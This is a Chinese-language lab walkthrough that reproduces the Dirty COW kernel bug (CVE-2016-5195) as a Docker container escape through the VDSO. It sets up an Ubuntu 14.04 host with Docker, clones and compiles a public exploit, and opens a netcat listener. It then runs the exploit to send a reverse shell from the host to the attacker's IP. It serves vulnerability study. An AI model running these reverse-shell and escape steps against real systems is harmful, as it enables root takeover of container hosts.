一、概述

Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。
竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。
在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。
 

二、过程

（一）安装ubuntu系统

docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机。使用ubuntu-14.04来复现，宿主机IP：192.168.242.144。

（二）安装docker和docker-compose

1、安装docker

//更新软件列表
sudo apt-get update

//安装依赖软件
sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common

//安装GPG证书
curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -

//写入软件源信息
sudo add-apt-repository "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"

//更新并安装 docker-ce
sudo apt-get -y update
sudo apt-get -y install docker-ce


2、安装docker-compose

//虚拟机中下载docker-compose
https://github.com/docker/compose/releases/tag/1.18.0

//虚拟机中将docker-compose文件复制到/usr/local/bin
sudo mv docker-compose-1.18.0-Linux-x86_64 /usr/local/bin/docker-compose

//赋予执行权限
chmod +x /usr/local/bin/docker-compose

//查看docker-compose版本
docker-compose version


安装完成。
 

（三）漏洞复现

1、下载测试环境

//在ubuntu1404虚拟机中下载测试环境
git clone https://github.com/gebl/dirtycow-docker-vdso.git
 

2、运行测试容器

//虚拟机中启动容器
cd dirtycow-docker-vdso/
sudo docker-compose run dirtycow /bin/bash


命令执行完成后自动进入容器。
 
//攻击者监听本地端口
nc -l -p 1234
 
3、执行漏洞利用程序
//在容器中执行下面的命令
cd /dirtycow-vdso

//编译
make

//反弹连接到攻击者主机
./0xdeadbeef 192.168.242.1:1234


4、攻击者得到反弹shell
攻击者本地得到容器所在宿主机的shell


可以看到，受控端IP地址为192.168.242.144，这是宿主机的IP地址，说明已经从容器中逃逸到宿主机中了。
